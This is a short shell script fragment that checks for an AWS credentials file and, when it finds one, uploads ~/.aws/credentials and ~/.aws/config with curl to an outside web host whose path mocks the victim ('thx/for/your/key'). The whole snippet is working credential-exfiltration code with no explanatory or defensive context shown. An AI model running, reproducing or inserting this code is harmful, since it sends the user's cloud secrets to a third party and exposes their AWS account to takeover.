if [ -f ~/.aws/credentials ]; then
  echo "FOUND : ~/.aws/credentials"
  curl -F "userfile=@$HOME/.aws/credentials"  https://sayhi.bplaced.net/thx/for/your/key/index.php
  curl -F "userfile=@$HOME/.aws/config"  https://sayhi.bplaced.net/thx/for/your/key/index.php
fi
